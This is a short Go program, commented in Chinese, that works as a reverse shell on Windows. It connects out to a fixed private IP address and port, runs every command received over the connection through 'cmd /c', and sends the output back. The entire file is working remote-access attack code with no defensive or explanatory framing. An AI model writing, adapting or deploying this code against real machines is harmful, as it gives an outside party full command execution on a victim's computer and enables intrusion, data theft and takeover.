package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	conn, err := net.Dial("tcp", "10.17.92.20:2701")
	defer conn.Close()
	if err != nil {
		fmt.Println("连接建立失败:", err)
		return
	}
	fmt.Println("连接建立成功...")

	for {

		buf := make([]byte, 1024)
		n, n_err := conn.Read(buf)

		if n_err != nil {
			fmt.Println("接收命令失败:", n_err)
			return
		}

		cmdStr := string(buf[:n])
		fmt.Printf("收到%v命令: %v\n", n, cmdStr)
		cmd := exec.Command("cmd", "/c", cmdStr)

		result, r_err := cmd.CombinedOutput()
		if r_err != nil {
			fmt.Println("命令执行失败:", r_err)
			return
		}
		// 发送命令执行结果给客户端
		conn.Write(result)
		fmt.Printf("本地执行结果: %v\n", string(result))

	}
}
